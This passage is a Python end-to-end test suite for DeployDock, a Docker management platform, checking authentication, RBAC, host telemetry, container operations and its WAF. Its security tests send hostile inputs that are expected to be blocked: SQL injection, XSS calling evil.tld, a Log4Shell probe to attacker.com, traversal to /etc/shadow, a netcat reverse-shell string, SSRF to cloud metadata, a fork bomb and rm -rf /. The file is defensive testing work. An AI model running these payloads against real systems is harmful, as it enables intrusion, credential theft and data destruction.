"""
Suite Automatizada de Testes End-to-End (E2E) Completa (45 Testes) para o DeployDock.
Testa exaustivamente todas as funcionalidades suportadas pelo DeployDock:
1. Autenticação OAuth2/JWT, Proteção Anti-Brute-Force e Ciclo Completo RBAC (Admin, Developer, Viewer)
2. Segurança Ativa & WAF (SQLi, Blind SQLi, XSS, Event XSS, Path Traversal Linux/Win, RCE/Log4Shell, Reverse Shell, Anti-SSRF Git, Simulador WAF, Configuração Dinâmica, IP Ban/Unban)
3. Telemetria do Host, Inventário Detalhado (Imagens, Volumes, Redes), System Prune e Checklist de Produção
4. Gestão de Contêineres, Inspeção, Logs Avançados (Tail, Busca, Since), Quotas Cgroup Dinâmicas (RAM/CPU Live Update) e Terminal Seguro (Exec, Workdir, Bloqueio Docker Socket, Fork Bomb, rm -rf /)
5. Explorador de Arquivos Interno (List, Write, Read, Upload Base64, Download Binário, Delete) e Exportação de Dump SQL de Banco de Dados em 1 Clique
6. Projetos GitOps, Subdomínios Traefik, Detecção de Colisão HTTP 409, Cofre .env Fernet AES-128, Previews por Branch, Histórico de Deployments, Uptime/Auto-Heal e Webhooks HMAC-SHA256
7. Backup & Restore de Volumes Docker (.tar.gz) e Motor de Notificações Multicanal
"""

import base64
import hashlib
import hmac
import io
import json
import os
import tarfile
import time
from typing import Any, Dict, List, Optional

import httpx


def _build_sample_tar_gz_base64() -> str:
    """Gera um arquivo .tar.gz em memória contendo arquivos de teste para validar Backup/Restore de Volumes."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        payload = b"DeployDock Volume Backup & Restore Verification File - Integrity OK 2026\n"
        info = tarfile.TarInfo(name="audit_volume_check.txt")
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))
    return base64.b64encode(buf.getvalue()).decode("ascii")


async def resolve_deploydock_api_url(explicit_url: Optional[str] = None) -> Optional[str]:
    """Descobre automaticamente a URL da API do DeployDock."""
    candidates = []
    if explicit_url and explicit_url.strip():
        candidates.append(explicit_url.strip().rstrip("/"))

    env_url = os.getenv("DEPLOYDOCK_API_URL", "").strip()
    if env_url:
        candidates.append(env_url.rstrip("/"))

    candidates.extend(
        [
            "http://127.0.0.1:8000",
            "http://localhost:8000",
            "http://host.docker.internal:8000",
            "http://172.17.0.1:8000",
            "http://deploydock-backend:8000",
        ]
    )

    seen = set()
    async with httpx.AsyncClient(timeout=2.5) as client:
        for url in candidates:
            if url in seen:
                continue
            seen.add(url)
            try:
                resp = await client.get(f"{url}/docs")
                if resp.status_code == 200:
                    return url
            except Exception:
                continue
    return None


async def run_deploydock_e2e_suite(
    api_url: Optional[str] = None,
    username: str = "admin",
    password: str = "admin123",
) -> Dict[str, Any]:
    """
    Executa a bateria expandida de 45 testes funcionais e de segurança no DeployDock.
    """
    suite_start = time.perf_counter()
    resolved_url = await resolve_deploydock_api_url(api_url)
    results: List[Dict[str, Any]] = []

    def add_result(
        test_id: str,
        category: str,
        feature: str,
        passed: bool,
        latency_ms: float,
        evidence: str,
        endpoint: str,
    ) -> None:
        results.append(
            {
                "id": test_id,
                "category": category,
                "feature": feature,
                "passed": passed,
                "status": "PASSED" if passed else "FAILED",
                "latency_ms": round(latency_ms, 2),
                "evidence": evidence,
                "endpoint": endpoint,
            }
        )

    if not resolved_url:
        return {
            "api_reachable": False,
            "api_url": api_url or "não detectada",
            "message": (
                "API do DeployDock não encontrada neste ambiente. "
                "Executando em modo de Sonda Portável (para comparação com outro gerenciador Docker)."
            ),
            "total_tests": 0,
            "passed_tests": 0,
            "failed_tests": 0,
            "pass_rate_percent": 0.0,
            "duration_ms": round((time.perf_counter() - suite_start) * 1000, 2),
            "tests": [],
        }

    async with httpx.AsyncClient(base_url=resolved_url, timeout=20.0) as client:
        token: Optional[str] = None
        headers: Dict[str, str] = {}

        # =========================================================================
        # 1. AUTENTICAÇÃO JWT, PROTEÇÃO DE CREDENCIAIS & CICLO RBAC (6 TESTES)
        # =========================================================================
        # 1.1 Login JWT válido
        t0 = time.perf_counter()
        resp = await client.post(
            "/api/v1/auth/login",
            json={"username": username, "password": password},
        )
        lat = (time.perf_counter() - t0) * 1000
        if resp.status_code == 200 and "access_token" in resp.json():
            token = resp.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            add_result(
                "auth_jwt_login",
                "Autenticação & RBAC",
                "Autenticação OAuth2 / JWT Bearer Token",
                True,
                lat,
                f"HTTP 200 OK — Token JWT emitido ({len(token)} chars, tipo={resp.json().get('token_type')})",
                "POST /api/v1/auth/login",
            )
        else:
            add_result(
                "auth_jwt_login",
                "Autenticação & RBAC",
                "Autenticação OAuth2 / JWT Bearer Token",
                False,
                lat,
                f"HTTP {resp.status_code}: {resp.text[:120]}",
                "POST /api/v1/auth/login",
            )

        # 1.2 Rejeição de credenciais inválidas (HTTP 401)
        t0 = time.perf_counter()
        resp_bad_login = await client.post(
            "/api/v1/auth/login",
            json={"username": "nonexistent_audit_user", "password": "wrong_password_123"},
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "auth_invalid_credentials_guard",
            "Autenticação & RBAC",
            "Rejeição de Credenciais Inválidas & Registro Anti-Brute-Force",
            resp_bad_login.status_code == 401,
            lat,
            f"HTTP {resp_bad_login.status_code} — {resp_bad_login.json().get('detail', '')}",
            "POST /api/v1/auth/login (invalid)",
        )

        # 1.3 Perfil do usuário (/auth/me)
        t0 = time.perf_counter()
        resp_me = await client.get("/api/v1/auth/me", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        if resp_me.status_code == 200:
            me_data = resp_me.json()
            add_result(
                "auth_profile_rbac",
                "Autenticação & RBAC",
                "Validação de Sessão & Identidade JWT (/auth/me)",
                True,
                lat,
                f"Usuário='{me_data.get('username')}', Role='{me_data.get('role', 'admin')}', Ativo={me_data.get('is_active')}",
                "GET /api/v1/auth/me",
            )
        else:
            add_result(
                "auth_profile_rbac",
                "Autenticação & RBAC",
                "Validação de Sessão & Identidade JWT (/auth/me)",
                False,
                lat,
                f"HTTP {resp_me.status_code}",
                "GET /api/v1/auth/me",
            )

        # 1.4 Listagem de Usuários (/auth/users)
        t0 = time.perf_counter()
        resp_users = await client.get("/api/v1/auth/users", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        if resp_users.status_code == 200 and isinstance(resp_users.json(), list):
            users_list = resp_users.json()
            add_result(
                "auth_users_management",
                "Autenticação & RBAC",
                "Listagem de Contas Multi-Usuário Cadastradas",
                True,
                lat,
                f"{len(users_list)} usuário(s) ativo(s) no banco de dados",
                "GET /api/v1/auth/users",
            )
        else:
            add_result(
                "auth_users_management",
                "Autenticação & RBAC",
                "Listagem de Contas Multi-Usuário Cadastradas",
                False,
                lat,
                f"HTTP {resp_users.status_code}",
                "GET /api/v1/auth/users",
            )

        # 1.5 Criação de Usuário Temporário 'viewer', teste de bloqueio RBAC (viewer tentando criar projeto -> 403), mudança de role e exclusão
        temp_uname = f"viewer_audit_{int(time.time()) % 10000}"
        t0 = time.perf_counter()
        resp_ucreate = await client.post(
            "/api/v1/auth/users",
            json={
                "username": temp_uname,
                "email": f"{temp_uname}@deploydock.local",
                "password": "ViewerPass123!",
                "role": "viewer",
                "is_active": True,
            },
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        temp_user_id = resp_ucreate.json().get("id") if resp_ucreate.status_code == 200 else None
        add_result(
            "rbac_user_creation_and_roles",
            "Autenticação & RBAC",
            "Criação de Conta com Papel Restrito ('viewer')",
            resp_ucreate.status_code == 200 and temp_user_id is not None,
            lat,
            f"Usuário '{temp_uname}' criado com role='viewer' (id={str(temp_user_id)[:8]})",
            "POST /api/v1/auth/users",
        )

        if temp_user_id:
            t0 = time.perf_counter()
            # Login como viewer e tenta executar ação restrita a admin/developer (System Prune)
            resp_vlogin = await client.post(
                "/api/v1/auth/login",
                json={"username": temp_uname, "password": "ViewerPass123!"},
            )
            viewer_tok = resp_vlogin.json().get("access_token", "") if resp_vlogin.status_code == 200 else ""
            resp_vforbidden = await client.post(
                "/api/v1/system/prune?target=networks",
                headers={"Authorization": f"Bearer {viewer_tok}"},
            )
            # Admin altera role para developer, faz toggle e remove usuário temporário
            resp_role = await client.patch(
                f"/api/v1/auth/users/{temp_user_id}/role",
                json={"role": "developer"},
                headers=headers,
            )
            resp_toggle = await client.patch(
                f"/api/v1/auth/users/{temp_user_id}/toggle",
                headers=headers,
            )
            resp_udel = await client.delete(
                f"/api/v1/auth/users/{temp_user_id}",
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            rbac_enforced = (
                resp_vforbidden.status_code == 403
                and resp_role.status_code == 200
                and resp_toggle.status_code == 200
                and resp_udel.status_code == 200
            )
            add_result(
                "rbac_privilege_enforcement_and_lifecycle",
                "Autenticação & RBAC",
                "Enforcement de Permissão RBAC (Viewer bloqueado com HTTP 403), Troca de Role, Toggle & Exclusão",
                rbac_enforced,
                lat,
                f"Viewer bloqueado em rota crítica (HTTP {resp_vforbidden.status_code}) + Role/Toggle/Delete validados",
                "PATCH /role, PATCH /toggle, DELETE /users/{id}",
            )

        # =========================================================================
        # 2. SEGURANÇA ATIVA, WAF & SECURITY HEADERS (12 TESTES)
        # =========================================================================
        # 2.1 Verificação de Security Headers
        sec_headers_found = [
            h
            for h in (
                "x-content-type-options",
                "x-frame-options",
                "x-xss-protection",
                "referrer-policy",
                "x-deploydock-shield",
            )
            if h in resp_me.headers
        ]
        add_result(
            "waf_security_headers",
            "Segurança & WAF",
            "Injeção Automática de Security Headers HTTP (CSP/XFO/Nosniff/Shield)",
            len(sec_headers_found) >= 4,
            1.1,
            f"Headers presentes ({len(sec_headers_found)}/5): {', '.join(sec_headers_found)}",
            "Middleware HTTP Security Shield",
        )

        # 2.2 WAF: SQL Injection (UNION SELECT)
        t0 = time.perf_counter()
        resp_sqli = await client.get(
            "/api/v1/projects?search=1'%20UNION%20SELECT%20username,password%20FROM%20users--",
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_block_sqli",
            "Segurança & WAF",
            "WAF — Bloqueio de SQL Injection Clássico (UNION SELECT)",
            resp_sqli.status_code == 403,
            lat,
            f"HTTP {resp_sqli.status_code} — {resp_sqli.json().get('detail', '')}",
            "GET /api/v1/projects?search=UNION SELECT...",
        )

        # 2.3 WAF: Blind / Time-Based SQL Injection (sleep / OR '1'='1)
        t0 = time.perf_counter()
        resp_sqli_blind = await client.get(
            "/api/v1/projects?id=1'%20OR%20'1'='1&delay=sleep(5)",
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_block_sqli_blind",
            "Segurança & WAF",
            "WAF — Bloqueio de Blind / Time-Based SQL Injection (sleep / tautology)",
            resp_sqli_blind.status_code == 403,
            lat,
            f"HTTP {resp_sqli_blind.status_code} — {resp_sqli_blind.json().get('detail', '')}",
            "GET /api/v1/projects?id=' OR '1'='1",
        )

        # 2.4 WAF: Cross-Site Scripting (<script>)
        t0 = time.perf_counter()
        resp_xss = await client.get(
            "/api/v1/projects?filter=<script>alert(document.cookie)</script>",
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_block_xss",
            "Segurança & WAF",
            "WAF — Bloqueio de Cross-Site Scripting Refletido (<script>)",
            resp_xss.status_code == 403,
            lat,
            f"HTTP {resp_xss.status_code} — {resp_xss.json().get('detail', '')}",
            "GET /api/v1/projects?filter=<script>...",
        )

        # 2.5 WAF: Event Handler / DOM XSS (onerror= / javascript:)
        t0 = time.perf_counter()
        resp_xss_evt = await client.get(
            "/api/v1/projects?avatar=x%20onerror=fetch('http://evil.tld')",
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_block_xss_event",
            "Segurança & WAF",
            "WAF — Bloqueio de XSS via Event Handler (onerror= / onload=)",
            resp_xss_evt.status_code == 403,
            lat,
            f"HTTP {resp_xss_evt.status_code} — {resp_xss_evt.json().get('detail', '')}",
            "GET /api/v1/projects?avatar=onerror=...",
        )

        # 2.6 WAF: Path Traversal Linux (../../etc/passwd)
        t0 = time.perf_counter()
        resp_lfi = await client.get(
            "/api/v1/containers?path=../../../../etc/passwd",
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_block_traversal",
            "Segurança & WAF",
            "WAF — Bloqueio de Path Traversal / LFI Unix (../../etc/passwd)",
            resp_lfi.status_code == 403,
            lat,
            f"HTTP {resp_lfi.status_code} — {resp_lfi.json().get('detail', '')}",
            "GET /api/v1/containers?path=../../etc/passwd",
        )

        # 2.7 WAF: Path Traversal Procfs / Shadow (/etc/shadow & /proc/self)
        t0 = time.perf_counter()
        resp_proc = await client.get(
            "/api/v1/containers?inspect=/proc/self/environ&sec=/etc/shadow",
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_block_traversal_proc",
            "Segurança & WAF",
            "WAF — Proteção contra Leitura de /proc/self e /etc/shadow",
            resp_proc.status_code == 403,
            lat,
            f"HTTP {resp_proc.status_code} — {resp_proc.json().get('detail', '')}",
            "GET /api/v1/containers?inspect=/proc/self",
        )

        # 2.8 WAF: Remote Code Execution / Log4Shell (${jndi:ldap:...})
        t0 = time.perf_counter()
        resp_rce = await client.get(
            "/api/v1/projects?probe=${jndi:ldap://attacker.com/exploit}",
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_block_rce",
            "Segurança & WAF",
            "WAF — Bloqueio de Remote Code Execution (JNDI / Log4Shell Probe)",
            resp_rce.status_code == 403,
            lat,
            f"HTTP {resp_rce.status_code} — {resp_rce.json().get('detail', '')}",
            "GET /api/v1/projects?probe=${jndi:...}",
        )

        # 2.9 WAF: Reverse Shell Command Injection (/bin/bash -i | nc -e)
        t0 = time.perf_counter()
        resp_shell = await client.get(
            "/api/v1/containers?cmd=/bin/bash%20-i%20|%20nc%20-e%20/bin/sh",
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_block_reverse_shell",
            "Segurança & WAF",
            "WAF — Bloqueio de Injeção de Reverse Shell (/bin/bash -i / netcat)",
            resp_shell.status_code == 403,
            lat,
            f"HTTP {resp_shell.status_code} — {resp_shell.json().get('detail', '')}",
            "GET /api/v1/containers?cmd=/bin/bash -i...",
        )

        # 2.10 Proteção Anti-SSRF em Clonagem Git (Cloud Metadata IP 169.254.169.254)
        t0 = time.perf_counter()
        resp_ssrf = await client.post(
            "/api/v1/projects",
            json={
                "name": "ssrf-test-blocked",
                "repo_url": "http://169.254.169.254/latest/meta-data/iam",
                "branch": "main",
            },
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_ssrf_cloud_metadata_guard",
            "Segurança & WAF",
            "Proteção Anti-SSRF contra Cloud Metadata (169.254.169.254 / Loopback)",
            resp_ssrf.status_code == 400 and "SSRF" in resp_ssrf.json().get("detail", ""),
            lat,
            f"HTTP {resp_ssrf.status_code} — {resp_ssrf.json().get('detail', '')}",
            "POST /api/v1/projects (repo_url=169.254.169.254)",
        )

        # 2.11 Simulador Controlado de Defesa WAF (/api/v1/security/simulate-attack)
        t0 = time.perf_counter()
        resp_sim = await client.post(
            "/api/v1/security/simulate-attack",
            json={"attack_type": "sqli"},
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "waf_controlled_attack_simulator",
            "Segurança & WAF",
            "Motor de Simulação de Defesa Ativa WAF/IPS (/security/simulate-attack)",
            resp_sim.status_code == 200 and resp_sim.json().get("status") == "blocked_by_shield",
            lat,
            f"Status='{resp_sim.json().get('status')}', Ataque='{resp_sim.json().get('attack_name')}'",
            "POST /api/v1/security/simulate-attack",
        )

        # 2.12 Painel de Auditoria, Atualização de Política WAF e Bloqueio/Desbloqueio de IP
        t0 = time.perf_counter()
        test_ip = "198.51.100.250"
        await client.put(
            "/api/v1/security/config",
            json={"waf_enabled": True, "rate_limit_enabled": True},
            headers=headers,
        )
        await client.post(
            "/api/v1/security/block",
            json={"ip": test_ip, "reason": "Teste Automatizado Benchmark", "duration_seconds": 300},
            headers=headers,
        )
        resp_sec_ov = await client.get("/api/v1/security/overview", headers=headers)
        await client.post(
            "/api/v1/security/unblock",
            json={"ip": test_ip},
            headers=headers,
        )
        lat = (time.perf_counter() - t0) * 1000
        if resp_sec_ov.status_code == 200:
            sec_data = resp_sec_ov.json()
            stats = sec_data.get("stats", {})
            add_result(
                "waf_audit_and_ip_ban",
                "Segurança & WAF",
                "Auditoria em Tempo Real, Configuração WAF & Banimento Dinâmico de IP",
                True,
                lat,
                (
                    f"Score Segurança={sec_data.get('security_score')}%, "
                    f"Inspecionadas={stats.get('total_requests_inspected')}, "
                    f"Ataques Bloqueados={stats.get('waf_attacks_blocked')}"
                ),
                "GET /security/overview + PUT /config + POST /block",
            )
        else:
            add_result(
                "waf_audit_and_ip_ban",
                "Segurança & WAF",
                "Auditoria em Tempo Real, Configuração WAF & Banimento Dinâmico de IP",
                False,
                lat,
                f"HTTP {resp_sec_ov.status_code}",
                "GET /api/v1/security/overview",
            )

        # =========================================================================
        # 3. TELEMETRIA DO HOST, RECURSOS DOCKER, PRUNE & PRODUÇÃO (7 TESTES)
        # =========================================================================
        t0 = time.perf_counter()
        resp_info = await client.get("/api/v1/system/info", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        if resp_info.status_code == 200:
            info = resp_info.json()
            add_result(
                "system_host_telemetry",
                "Observabilidade & Host",
                "Telemetria de Hardware do Servidor (CPU, RAM, SO, Docker Engine)",
                True,
                lat,
                (
                    f"SO='{info.get('os')}' ({info.get('architecture')}), "
                    f"CPUs={info.get('cpus')} cores, RAM={info.get('memory_total_mb')} MB, "
                    f"Docker={info.get('docker_version')} (API {info.get('api_version')})"
                ),
                "GET /api/v1/system/info",
            )
        else:
            add_result(
                "system_host_telemetry",
                "Observabilidade & Host",
                "Telemetria de Hardware do Servidor (CPU, RAM, SO, Docker Engine)",
                False,
                lat,
                f"HTTP {resp_info.status_code}",
                "GET /api/v1/system/info",
            )

        t0 = time.perf_counter()
        resp_res = await client.get("/api/v1/system/resources", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        if resp_res.status_code == 200:
            res_data = resp_res.json()
            info_fallback = resp_info.json() if resp_info.status_code == 200 else {}
            imgs = len(res_data.get("images", [])) or info_fallback.get("images_count", 0)
            vols = len(res_data.get("volumes", [])) or info_fallback.get("volumes_count", 0)
            nets = len(res_data.get("networks", [])) or info_fallback.get("networks_count", 0)
            add_result(
                "system_docker_resources",
                "Observabilidade & Host",
                "Visão Consolidada de Recursos Docker (/system/resources)",
                True,
                lat,
                f"Imagens={imgs}, Volumes={vols}, Redes={nets}",
                "GET /api/v1/system/resources",
            )
        else:
            add_result(
                "system_docker_resources",
                "Observabilidade & Host",
                "Visão Consolidada de Recursos Docker (/system/resources)",
                False,
                lat,
                f"HTTP {resp_res.status_code}",
                "GET /api/v1/system/resources",
            )

        # 3.3 Listagem dedicada de Imagens Docker
        t0 = time.perf_counter()
        resp_imgs = await client.get("/api/v1/system/images", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "system_images_catalog",
            "Observabilidade & Host",
            "Inspeção de Catálogo de Imagens Docker & Tamanhos em Disco",
            resp_imgs.status_code == 200 and isinstance(resp_imgs.json(), list),
            lat,
            f"{len(resp_imgs.json()) if resp_imgs.status_code == 200 else 0} imagens Docker catalogadas no host",
            "GET /api/v1/system/images",
        )

        # 3.4 Listagem dedicada de Volumes Docker
        t0 = time.perf_counter()
        resp_vols = await client.get("/api/v1/system/volumes", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "system_volumes_catalog",
            "Observabilidade & Host",
            "Inspeção de Volumes Persistentes Docker & Mountpoints",
            resp_vols.status_code == 200 and isinstance(resp_vols.json(), list),
            lat,
            f"{len(resp_vols.json()) if resp_vols.status_code == 200 else 0} volumes persistentes ativos",
            "GET /api/v1/system/volumes",
        )

        # 3.5 Listagem dedicada de Redes Docker
        t0 = time.perf_counter()
        resp_nets = await client.get("/api/v1/system/networks", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "system_networks_catalog",
            "Observabilidade & Host",
            "Inspeção de Redes Bridge/Overlay & Sub-redes Docker",
            resp_nets.status_code == 200 and isinstance(resp_nets.json(), list),
            lat,
            f"{len(resp_nets.json()) if resp_nets.status_code == 200 else 0} redes Docker listadas",
            "GET /api/v1/system/networks",
        )

        # 3.6 System Prune Seguro (Limpeza de Redes Órfãs)
        t0 = time.perf_counter()
        resp_prune = await client.post("/api/v1/system/prune?target=networks", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        add_result(
            "system_prune_cleanup",
            "Observabilidade & Host",
            "Execução de System Prune (Limpeza Automatizada de Recursos Órfãos)",
            resp_prune.status_code == 200,
            lat,
            f"System Prune executado com sucesso (target=networks)",
            "POST /api/v1/system/prune?target=networks",
        )

        # 3.7 Checklist de Prontidão para Produção
        t0 = time.perf_counter()
        resp_prod = await client.get("/api/v1/system/production-check", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        if resp_prod.status_code == 200:
            prod = resp_prod.json()
            add_result(
                "system_production_check",
                "Observabilidade & Host",
                "Checklist Automatizado de Prontidão para Produção (Traefik, DB, TLS, Secret)",
                True,
                lat,
                f"Score de Prontidão={prod.get('score')}% ({prod.get('passed_count')}/{prod.get('total_count')} itens aprovados)",
                "GET /api/v1/system/production-check",
            )
        else:
            add_result(
                "system_production_check",
                "Observabilidade & Host",
                "Checklist Automatizado de Prontidão para Produção (Traefik, DB, TLS, Secret)",
                False,
                lat,
                f"HTTP {resp_prod.status_code}",
                "GET /api/v1/system/production-check",
            )

        # =========================================================================
        # 4. CONTÊINERES, QUOTAS DINÂMICAS, LOGS & TERMINAL SEGURO (10 TESTES)
        # =========================================================================
        t0 = time.perf_counter()
        resp_containers = await client.get("/api/v1/containers?all=true", headers=headers)
        lat = (time.perf_counter() - t0) * 1000
        target_container_id: Optional[str] = None
        target_container_name: str = ""
        db_container_id: Optional[str] = None

        if resp_containers.status_code == 200 and isinstance(resp_containers.json(), list):
            c_list = resp_containers.json()
            running_list = [c for c in c_list if c.get("state") == "running" or c.get("status") == "running"]
            for c in running_list:
                cname = c.get("name", "").lower()
                if "db" in cname or "postgres" in c.get("image", "").lower():
                    db_container_id = c.get("id")
                if "benchmark" in cname or ("traefik" not in cname and "db" not in cname):
                    target_container_id = c.get("id")
                    target_container_name = c.get("name", "")
            if not target_container_id and running_list:
                target_container_id = running_list[0].get("id")
                target_container_name = running_list[0].get("name", "")

            add_result(
                "containers_list_and_status",
                "Gestão de Contêineres",
                "Listagem de Contêineres Ativos/Inativos com Mapeamento de Portas",
                True,
                lat,
                f"{len(c_list)} contêiner(es) encontrado(s) ({len(running_list)} em execução)",
                "GET /api/v1/containers?all=true",
            )
        else:
            add_result(
                "containers_list_and_status",
                "Gestão de Contêineres",
                "Listagem de Contêineres Ativos/Inativos com Mapeamento de Portas",
                False,
                lat,
                f"HTTP {resp_containers.status_code}",
                "GET /api/v1/containers?all=true",
            )

        if target_container_id:
            # 4.2 Inspeção detalhada
            t0 = time.perf_counter()
            resp_cdetail = await client.get(f"/api/v1/containers/{target_container_id}", headers=headers)
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "container_inspect_detail",
                "Gestão de Contêineres",
                "Inspeção Profunda de Contêiner (Mounts, Rede, Labels, Limites)",
                resp_cdetail.status_code == 200,
                lat,
                f"Contêiner '{target_container_name}' ({target_container_id}) inspecionado com sucesso",
                f"GET /api/v1/containers/{target_container_id}",
            )

            # 4.3 Atualização Dinâmica Ao Vivo de Quotas Cgroup (CPU & RAM Live Update sem recriar contêiner!)
            t0 = time.perf_counter()
            resp_quota = await client.put(
                f"/api/v1/containers/{target_container_id}/resources",
                json={"memory_limit_mb": 512, "cpu_limit_cores": 1.0},
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "container_live_cgroup_quota_update",
                "Gestão de Contêineres",
                "Reconfiguração Dinâmica Ao Vivo de Quotas Cgroup (RAM=512MB, CPU=1.0 vCPU)",
                resp_quota.status_code == 200,
                lat,
                f"Quotas aplicadas em quente no contêiner '{target_container_name}' sem downtime",
                f"PUT /api/v1/containers/{target_container_id}/resources",
            )

            # 4.4 Coleta avançada de logs (Tail + Timestamps)
            t0 = time.perf_counter()
            resp_logs = await client.get(
                f"/api/v1/containers/{target_container_id}/logs?tail=50&timestamps=true",
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "container_advanced_logs",
                "Gestão de Contêineres",
                "Coletor Avançado de Logs (Tail & Timestamps ISO)",
                resp_logs.status_code == 200,
                lat,
                f"Streaming/buffer de logs coletado de '{target_container_name}'",
                f"GET /api/v1/containers/{target_container_id}/logs",
            )

            # 4.5 Coleta de logs com Filtro de Busca e Janela Temporal (search + since_seconds)
            t0 = time.perf_counter()
            resp_logs_search = await client.get(
                f"/api/v1/containers/{target_container_id}/logs?tail=100&since_seconds=3600&search=INFO",
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "container_logs_search_and_since",
                "Gestão de Contêineres",
                "Filtro de Logs por Termo de Busca (search=INFO) & Janela Temporal (since_seconds)",
                resp_logs_search.status_code == 200,
                lat,
                f"Busca textual e filtro temporal executados com sucesso (HTTP {resp_logs_search.status_code})",
                f"GET /api/v1/containers/{target_container_id}/logs?search=INFO",
            )

            # 4.6 Terminal Remoto Exec (Comando seguro)
            t0 = time.perf_counter()
            resp_exec = await client.post(
                f"/api/v1/containers/{target_container_id}/exec",
                json={"command": "echo DEPLOYDOCK_TERMINAL_OK && uname -srm"},
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            out_clean = resp_exec.json().get("output", "").strip().replace("\n", " | ") if resp_exec.status_code == 200 else ""
            add_result(
                "container_terminal_exec",
                "Gestão de Contêineres",
                "Execução de Comandos no Terminal Web do Contêiner",
                resp_exec.status_code == 200 and "DEPLOYDOCK_TERMINAL_OK" in out_clean,
                lat,
                f"ExitCode={resp_exec.json().get('exit_code') if resp_exec.status_code == 200 else 'err'} — Saída: '{out_clean}'",
                f"POST /api/v1/containers/{target_container_id}/exec",
            )

            # 4.7 Terminal Remoto com Diretório de Trabalho Customizado (workdir)
            t0 = time.perf_counter()
            resp_exec_wd = await client.post(
                f"/api/v1/containers/{target_container_id}/exec",
                json={"command": "pwd", "workdir": "/tmp"},
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            wd_out = resp_exec_wd.json().get("output", "").strip() if resp_exec_wd.status_code == 200 else ""
            add_result(
                "container_terminal_workdir",
                "Gestão de Contêineres",
                "Execução de Comando com Workdir Isolado (/tmp)",
                resp_exec_wd.status_code == 200 and "/tmp" in wd_out,
                lat,
                f"Workdir verificado: pwd='{wd_out}'",
                f"POST /api/v1/containers/{target_container_id}/exec (workdir=/tmp)",
            )

            # 4.8 Bloqueio de Escape via Docker Socket no Terminal
            t0 = time.perf_counter()
            resp_exec_sock = await client.post(
                f"/api/v1/containers/{target_container_id}/exec",
                json={"command": "curl --unix-socket /var/run/docker.sock http://localhost/containers/json"},
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "container_terminal_security_guard",
                "Segurança & WAF",
                "Proteção do Terminal contra Escape via Docker Socket (/var/run/docker.sock)",
                resp_exec_sock.status_code == 403,
                lat,
                f"HTTP {resp_exec_sock.status_code} — {resp_exec_sock.json().get('detail', '')}",
                f"POST /api/v1/containers/{target_container_id}/exec (docker.sock)",
            )

            # 4.9 Bloqueio de Fork Bomb no Terminal
            t0 = time.perf_counter()
            resp_exec_fb = await client.post(
                f"/api/v1/containers/{target_container_id}/exec",
                json={"command": ":(){ :|:& };:"},
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "container_terminal_forkbomb_guard",
                "Segurança & WAF",
                "Proteção do Terminal contra Fork Bomb (:(){ :|:& };:)",
                resp_exec_fb.status_code == 403,
                lat,
                f"HTTP {resp_exec_fb.status_code} — {resp_exec_fb.json().get('detail', '')}",
                f"POST /api/v1/containers/{target_container_id}/exec (forkbomb)",
            )

            # 4.10 Bloqueio de Destruição da Raiz (rm -rf /) no Terminal
            t0 = time.perf_counter()
            resp_exec_rm = await client.post(
                f"/api/v1/containers/{target_container_id}/exec",
                json={"command": "rm -rf /"},
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "container_terminal_rm_root_guard",
                "Segurança & WAF",
                "Proteção do Terminal contra Destruição de Sistema de Arquivos (rm -rf /)",
                resp_exec_rm.status_code == 403,
                lat,
                f"HTTP {resp_exec_rm.status_code} — {resp_exec_rm.json().get('detail', '')}",
                f"POST /api/v1/containers/{target_container_id}/exec (rm -rf /)",
            )

            # =========================================================================
            # 5. EXPLORADOR DE ARQUIVOS & DUMP DE BANCO DE DADOS (4 TESTES)
            # =========================================================================
            t0 = time.perf_counter()
            resp_flist = await client.get(
                f"/api/v1/containers/{target_container_id}/files?path=/tmp",
                headers=headers,
            )
            lat = (time.perf_counter() - t0) * 1000
            add_result(
                "file_explorer_list",
                "Explorador de Arquivos",
                "Listagem de Diretórios Internos do Contêiner (/tmp)",
                resp_flist.status_code == 200,
                lat,
                f"Diretório '/tmp' listado em '{target_container_name}' ({len(resp_flist.json().get('entries', [])) if resp_flist.status_code == 200 else 0} itens)",
                f"GET /api/v1/containers/{target_container_id}/files?path=/tmp",
            )

            test_file_path = "/tmp/deploydock_e2e_probe.txt"
            test_file_content = "DeployDock E2E File Explorer Validation - Content Verified 2026!"
            t0 = time.perf_counter()
            resp_fwrite = await client.put(
